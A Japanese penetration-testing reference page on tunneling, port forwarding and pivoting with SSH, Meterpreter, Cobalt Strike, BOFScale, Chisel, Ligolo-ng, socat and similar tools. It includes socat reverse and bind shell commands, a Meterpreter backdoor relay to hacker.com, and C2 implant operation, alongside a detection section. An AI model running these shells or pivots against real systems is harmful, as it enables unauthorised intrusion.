# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

ローカルの HTTP または TCP サービスをパブリックリレー経由で公開する方法については、[ローカルサービスをインターネットに公開する](expose-local-to-the-internet.md)を参照してください。この章では、ホスト間のフォワーディングとピボットについて説明します。

## Nmap のヒント

> [!WARNING]
> Nmap のプロキシサポートは TCP 接続に限られ、ping、ポートスキャン、OS 検出スキャンには影響しません。スキャナーが SOCKS プロキシの背後にある場合は、**ホスト検出を無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後のコマンドでは、Evil-WinRM の `-u` オプションと `-i` オプションを使ってアカウントと WinRM ホストを指定します。WinRM のデフォルトポートは 5985 です。<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSHは、暗号化されたチャネル経由でX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHグラフィカル接続（X）

`-Y`は信頼されたX11 forwardingを有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Serverで新しいPortを開く --> Other port

Remote (`-R`) forwardingはSSH server上で待ち受け、ローカル側に接続します。明示的なbind addressによって、そのlistenerに到達できるinterfaceが決まります。<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

ローカルポート --> Compromised host (SSH) --> Third_box:Port

Local（`-L`）forwarding はクライアントで待ち受け、SSH サーバー側から宛先に接続します。<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の場所

Dynamic (`-D`) forwarding は、接続がリモート側から開かれるローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump によるマルチホップ

`-J`/`ProxyJump` は、カンマ区切りで指定した1つ以上のジャンプホストを経由してターゲットに接続します。転送オプションは引き続き最終的な SSH 接続に適用されるため、以下の SOCKS リスナーは最初の踏み台ではなく、`internal-target` から接続先にアクセスします。これにより、ジャンプホストにログインして2つ目の SSH クライアントを起動する必要がありません。<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

ジャンプマシン固有のオプションは `~/.ssh/config` に記述してください。宛先向けのコマンドライン設定は、中継ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、内部ホストから DMZ を経由して自分のホストに reverse shells を取得するのに役立ちます。

サーバーの `GatewayPorts` 設定は、remote forward が loopback の範囲外に bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

このroot権限を使う例では、両方のホストにトンネルデバイスを作成します。サーバーではtun forwardingを許可する必要があり、選択したアカウントにはtunデバイスへのアクセス権が必要です。ここで`root`アカウントを使う方法の一つは、`PermitRootLogin yes`を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

サーバー側で転転送を有効にする

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

クライアント側で新しいルートを設定する

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6では、Terrapinによる初期トランスポートの完全性攻撃に対抗するため、strict-KEX拡張が追加されました。可能であれば両方のpeerを更新し、古い実装については、転送されたchannelがバージョンだけで保護されていると考えず、ベンダーのガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、サブネットワーク宛てのすべてのトラフィックを**ssh**で**tunnel**できます。\
たとえば、10.10.10.0/24宛てのすべてのトラフィックを転送します。

`sshuttle`はSSH経由の透過プロキシを提供し、以下に示すようにサブネットの選択とカスタムSSHコマンドに対応しています。<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

秘密鍵で接続する

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit の `portfwd` はローカルおよびリモートのポートフォワーディングに対応しています。一方、SOCKS proxy module は session routes または `autoroute` と連携することを想定しており、これらの例ではデフォルトでポート 1080 をリッスンします。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

ローカルポート --> 侵害されたホスト（アクティブセッション） --> Third_box:ポート

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

別の方法：

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt StrikeのBeaconは、Beaconを介してSOCKS4a/SOCKS5接続を中継できます。`rportfwd`は侵害されたホスト上でポートをバインドし、`rportfwd_local`はCobalt Strikeクライアントから接続先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon経由でトラフィックをルーティングするインターフェース上で、Team Serverのポートを開きます。<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> この場合、**ポートはTeam ServerではなくBeaconホスト上で開かれ**、トラフィックはTeam Serverに送信された後、そこから指定されたhost:portに転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

The reverse-forwarding manual には、次の動作が記載されています:<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間のリレーではなく、Team Server へのトラフィックのトンネリング用に設計されています**。
- トラフィックは、P2P リンクを含む Beacon の C2 トラフィック内で**トンネリングされます**。
- 高いポート番号を使うと、通常は特権ポートの制限を回避できますが、対象 OS のポリシーと既存のリスナーには引き続き注意が必要です。

### rPort2Port local

> [!WARNING]
> この場合、**ポートは Team Server ではなく Beacon ホスト上で開かれ**、**トラフィックは Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port に転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## yggstackによるYggdrasil userspace overlay

[Yggstack](https://github.com/yggdrasil-network/yggstack)は、TUN interfaceや管理者権限なしで、暗号化されたYggdrasil IPv6 meshに参加します。overlay内への接続用にローカルSOCKS5 listenerを提供し、双方向のTCP forwardingにも対応します。<sup>[[64]](#references)</sup> pivotから設定済みのpeerに到達できる必要があり、overlay addressに到達するには、operator endpointもmeshに参加していなければなりません。<sup>[[65]](#references)</sup>

設定を生成し、到達可能なpeer URIを`Peers`セクションに追加したら、SOCKS listenerまたはremote-port exposure modeを選びます。<sup>[[64]](#references)[[65]](#references)</sup> 後者では、`127.0.0.1:8080`にバインドされたサービスが、ノードのYggdrasil addressのポート`18080`で公開されます。通常のInternet上で公開されるわけではありません。public meshでは、他のoverlay nodeが公開されたサービスに到達できるため、peer connectionはアクセス制御の境界にはなりません。<sup>[[64]](#references)[[66]](#references)</sup> 以下のコマンドは、同じnodeを実行する別々の方法です。<sup>[[64]](#references)</sup>

```bash
./yggstack -genconf > yggdrasil.conf
# Add a peer URI to the Peers section of yggdrasil.conf first.
./yggstack -useconffile yggdrasil.conf -socks 127.0.0.1:1080
./yggstack -useconffile yggdrasil.conf -remote-tcp 18080:127.0.0.1:8080
```

Go agentは、別個の`yggstack`プロセスを起動する代わりに、userspace stackを組み込めます。ESETは、起動ごとに新しいEd25519 identityを生成してoverlay IPv6 addressを変更し、開示されるノードメタデータを制限するために`NodeInfo`を空にし、`NodeInfoPrivacy`を設定する実装を文書化しました。このagentはmesh内のHTTPS endpointと通信し、overlay addressを介してローカルTCP listenerを公開できます。<sup>[[64]](#references)[[67]](#references)</sup>

overlayによって通常のegress viewから最終宛先を隠せる場合はありますが、peer connectionや、直接接続するpeerから見えるsource IPは隠せません。Yggdrasilはanonymityを提供しません。<sup>[[66]](#references)[[67]](#references)</sup> 暗号化されたtransportとanonymityの違いについては、[network privacy and anonymous connectivity](../privacy/network-privacy-and-anonymous-connectivity.md)を参照してください。

## Tailcat：アカウント不要のuserspace TCP forwarding

Tailcatは、TailscaleのWireGuard/NAT traversal/DERP data planeを、Tailscale control planeなしで使用します。Tailscale accountもadministrator privilegesも不要で、host routeのインストールやDNSの変更も行いません。[Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve)や、in-processの[BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet)とは異なり、サーバーは*tailcat address*を帯域外で共有します。クライアントはそのaddressを使って、リモートノードが提供するportに接続します。<sup>[[62]](#references)</sup>

リモートノードのport `4444`ですでにTCP serviceがlistenしている場合は、そこで`serve`を起動し、表示されたaddressをクライアント側の`forward`に渡します。2つ目のコマンドはデフォルトで`127.0.0.1:18080`にbindするため、通常のTCP socketにしか対応していないローカルプロセスでも、このloopback portに接続すれば、Tailcatを介してリモートのport `4444`にトラフィックを送れます。<sup>[[62]](#references)</sup> port番号はTailcat固有のものではありません。<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

アドレスにはサーバーのWireGuard公開鍵と、現在のリリースではデフォルトで事前共有鍵が含まれます。これは認証情報として扱ってください。制限のないサーバーは、アドレスを知っているピアからの接続を受け入れます。一時的なアドレスはサーバーの終了時に使えなくなります。保存された`default`キーがある場合、通常の`serve`は次回以降の実行でも同じアドレスを再利用するため、起動メッセージを確認し、アドレスが漏れる可能性がある場合は`serve --allow`でクライアントを制限してください。<sup>[[62]](#references)</sup>

接続には直接UDP経路またはDERPリレーを使用できます。これにより専用のC2ドメインは不要になりますが、ネットワーク上の活動が見えなくなるわけではありません。<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN経由のインプロセスtailnet

[BOFScale](https://github.com/NetSPI/BOFscale)は、TUNドライバーやサービスをインストールせずに、Windows C2 implant内で改変版のTailscale overlayを実行します。構成要素は、非同期CGo `c-shared` `tailscaled` BOF-PE、ローカルAPIと通信する小型のC++ BOF-PE、非同期の`socksportfwd` TCP-to-SOCKS5ブリッジの3つです。<sup>[[53]](#references)[[54]](#references)</sup>

### CDN互換のTS2021とDERP

Tailscaleは通常、NoiseベースのTS2021 control channelとDERP relayに独自のHTTP upgradeを使用します。BOFScaleはこれらのバイトストリームを維持しながら、RFC 6455 WebSocketで転送します。`Sec-WebSocket-Protocol: ts2021`または`derp`を使用することで、標準のWebSocket upgradeのみを受け付けるCDNの背後に、オペレーターが制御するHeadscale/DERP originを配置できます。改変されたクライアントはHTTP `500`の後にTS2021をWebSocketで再試行し、HTTP `426`の後にDERPを再試行します。また、DERP WebSocket dialerがホストのproxy設定を使用するようにします。BOFは、失敗が確認されている最初の試行をスキップするため、`TS_DEBUG_DERP_WS_CLIENT=1`を設定します。<sup>[[53]](#references)[[54]](#references)</sup>

CDNとorigin proxyは、`/ts2021`と`/derp`のWebSocket upgradeを維持し、`/key`を通常のHTTPとして転送する必要があります。また、relayセッションは無期限に開いたままになることがあるため、内部の読み書きタイムアウトを無効にする必要があります。付属のHeadscale設定では`verify_clients`を有効にし、オペレーターに埋め込まれたDERP mapのみを公開し、Tailscaleが運用するrelayへのフォールバックを防ぐために`derp.urls`を空にしています。<sup>[[53]](#references)[[54]](#references)</sup>

### インプロセスdaemonと名前付きパイプ制御

上書きされない限り、BOFのエントリーポイントは`-tun=userspace-networking`、`-state mem:`、`-no-logs-no-support`を指定して`tailscaled`を起動し、その後UUID名のパイプを作成します。Goのstdout/stderrをOSパイプ経由でBeacon出力APIにリダイレクトするため、daemonとGo runtime全体はメモリ上に常駐しますが、状態やログがTailscaleのディレクトリに書き込まれることはありません。<sup>[[53]](#references)[[54]](#references)</sup>

軽量クライアントは、そのパイプ上でTailscaleのHTTP/1.0ローカルAPIを再現します。daemonの`safesocket`レイヤーはパイプクライアントを偽装するため、`SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`を指定してパイプを開き、`Tailscale-Cap: 125`を送信します。そしてローカルAPIを、`up`、`down`、`status`、route advertisement、shutdownの各操作に対応付けます。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemonにshutdownを要求した後、手動でマッピングしたGo BOF-PEをアンロードしないでください。runtimeとgarbage collectorのgoroutineが、loaderによってアンマップされたメモリ上で実行を続ける可能性があります。`tailscaled`は使い捨てのプロセスで実行し、最終的なクリーンアップではそのプロセスを終了してください。<sup>[[54]](#references)</sup>

### userspace SOCKS5経由でホスト発のトラフィックを中継する

受信するtailnet接続とadvertiseされたsubnet routeはuserspace network stack内で機能しますが、侵害されたホスト上の通常のプロセスにはoverlayへのOS routeがありません。そのため`socksportfwd`は、victim側のTCP portで待ち受け、daemonの`0.0.0.0:1080` listenerとSOCKS5 `NO AUTH`をネゴシエートし、tailnetの宛先に対して`CONNECT`を発行して、両方向の通信を非同期に中継します。宛先がMagicDNS名の場合は`ATYP_DOMAIN`を使用するため、Windows resolverに名前を公開せずに`tailscaled`が名前を解決します。<sup>[[53]](#references)[[54]](#references)</sup>

以下に最小限のオペレーター操作を示します。このCDN設計を通過できないため、オペレーターノードとimplantの両方で改変版のバイナリを使用する必要があります。<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

ローカルフォワードを使うと、見かけ上の認証リスナーとリレーツールを分離できます。マシンに侵害ホストのバインドされたポートへ認証させ、tailnet 経由で `ntlmrelayx` に転送し、さらに AD CS、LDAP、HTTP、SMB、またはその他の互換性のあるターゲットへリレーします。脆弱性固有の手順については、[WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) と [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) を参照してください。BOFScale はトランスポートにすぎません。<sup>[[54]](#references)</sup>

### Detection

単一の弱い指標ではなく、次の組み合わせを探してください。通常 Go ベースではないプロセス内の Go runtime、制限の緩い SDDL `D:(A;;GA;;;WD)` を持つ UUID pipe、想定外の `0.0.0.0:1080` SOCKS リスナー、CDN アドレスへの長時間持続する TLS WebSocket。TLS inspection を行う場合、所有プロセスが許可された `tailscaled` service でないのに `Sec-WebSocket-Protocol: derp` または `ts2021` が使われていたらフラグを立ててください。リポジトリの `bofscale.yar` ルールには、3つすべての BOF-PE コンポーネントを対象とするメモリシグネチャが含まれています。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

このプロジェクトは、`tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの web tunnel endpoint を提供します。ローカルプロキシを起動する前に、対応する endpoint を1つアップロードしてください。<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases ページからダウンロードできます。\
Chisel は SSH で保護された接続を使用して HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server ビルドを使用し、選択したリリースのコマンド構文を確認してください。<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### ポートフォワーディング

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC 上の HTTP/3）経由で、static または dynamic forward を中継します。現在のビルドでは、TCP、UDP、Unix socket、stdio、SOCKS5、HTTP proxying、および Linux の transparent-proxy listener が、forward モードと reverse モードの両方でサポートされています。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

攻撃者側でサーバーを起動し、ピボット側から `-R` を使って外向きに接続させます。この向きでは、SOCKS5 listener は **サーバー** 上に作成され、要求された接続は **クライアント／ピボット** のネットワークから発信されます。<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forwardも同じ方向を使用します。たとえば、次の例では、pivotから到達できる`10.10.10.20:445`を、攻撃者側のloopbackポート`8445`で公開します:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### エグレスとトランスポートの詳細

- 明示的な HTTP proxy を経由するには、クライアントに `-p http://user:pass@proxy:8080` を追加します。`curl` などのクライアントでは `socks5h://127.0.0.1:1080` を使う（またはアプリケーションで proxied DNS を有効にする）ことで、内部名をローカル resolver に漏らさず、トンネルの先で解決できます。<sup>[[52]](#references)</sup>
- `wss://` は TLS で保護された WebSocket を選択します。`https://` クライアントは HTTP/2 を選択しますが、reverse proxy/CDN によるバッファリングや HTTP/1 への変換は双方向ストリームを壊すことがよくあります。このモードをテストする際は、wstunnel server を直接公開してください。<sup>[[52]](#references)</sup>
- `wts://` は QUIC 上の WebTransport を選択します。`--enable-webtransport`（または `wts://` の listen URL）を指定して server を起動し、listen port で UDP を許可してください。このモードは、TCP を転送する従来の HTTP `CONNECT` proxy を経由できません。<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream project は、内蔵の self-signed certificate をプライバシー保護として扱わないよう警告しています。有効な custom certificate と `--tls-verify-certificate`（または mTLS）を使用し、リモートアクセスが意図されている場合を除いて proxy listener を loopback に限定してください。機密性が重要な場合は、すでに安全な protocol をトンネルしてください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng の quickstart では、proxy 上の TUN interface、agent の certificate-fingerprint validation、およびトンネル対象ネットワークの route 設定について説明しています。<sup>[[17]](#references)</sup>

### トンネリング

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agentのバインドとリスニング

Ligolo-ngでは、agent上にリスナーを追加してproxy側のアドレスへ転送できます。また、予約済みの`240.0.0.0/4`範囲へのルートを設定すると、agent内のサービスにアクセスできます。<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agentのローカルポートへのアクセス

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側からreverse tunnelを開始し、攻撃者側のloopbackアドレスでSOCKS4 proxyを公開します。READMEには、NTLM proxyの認証情報とhashのオプションも記載されています。<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

**NTLM proxy経由でPivot**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などのアドレス型を組み合わせます。以下の例では、ドキュメントに記載されているこれらのエンドポイントを組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### socks経由のPort2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat 経由の Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

被害者のコンソールで最後の行の代わりにこの行を実行すると、socat のドキュメントに記載されている `PROXY` address type を使って**未認証プロキシ**を経由できます。<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat トンネル

**/bin/sh console**

Client と Server の両方で証明書を作成する。

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

ローカルの SSH ポート（22）を攻撃者ホストの 443 ポートに接続する

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールで、`ssh`と同様のSSH転送オプションを備えています。<sup>[[22]](#references)</sup>

SSHポートには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、パスワードがプロセス一覧に表示されるため、可能であれば鍵認証または`-pwfile`を使用してください。<sup>[[22]](#references)[[23]](#references)</sup>

このバイナリは被害者の環境で実行されるSSHクライアントであるため、逆方向接続用にSSHサービスとポートを開放します。以下では`-R`を使用して、ローカルからアクセス可能なポートを攻撃者のマシンに転送します。<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストが必要とする権限を持つコンテキストを使用してください。Microsoft は、以下で使用する `v4tov4` の追加、表示、削除の形式を説明しています。<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### スケジュールされたタスクを使った `portproxy` のデプロイ

管理者の認証情報を利用できる場合、リモートのタスク スケジューラで専用のリレーをアップロードせずに、ネイティブの転送ルールをインストールできます。たとえば、[Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) を使うと、ピボットで TCP/443 をリッスンし、接続を内部の SMB サービスに中継できます。<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

このルールは永続的なため、`netsh interface portproxy show v4tov4` で列挙し、テスト後に明示的に削除してください。`portproxy` が提供するのは転送のみです。ホストのファイアウォールでもリスニングポートを許可する必要があります。<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**システムへの RDP アクセスが必要です**。\
ダウンロード:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使って、既存の RDP セッション経由で SOCKS5 接続を転送します。クライアントプラグインは `127.0.0.1:1080` でリスンし、サーバーコンポーネントは RDP 接続先で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは Windows の Remote Desktop Service 機能に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は**RDP 接続経由でパケットをトンネリングする**役割を担います。
